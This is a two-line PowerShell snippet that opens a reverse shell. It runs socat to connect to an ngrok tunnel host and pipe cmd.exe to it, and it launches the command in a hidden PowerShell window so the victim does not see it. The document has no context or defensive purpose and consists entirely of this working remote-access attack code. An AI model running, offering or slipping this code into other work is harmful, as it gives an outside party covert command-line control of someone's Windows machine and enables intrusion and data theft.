$command = '.\socat.exe tcp-connect:5.tcp.eu.ngrok.io:11800 exec:"cmd.exe",pipes'
Start-Process powershell.exe -ArgumentList "-NoProfile -Command `$command" -WindowStyle Hidden
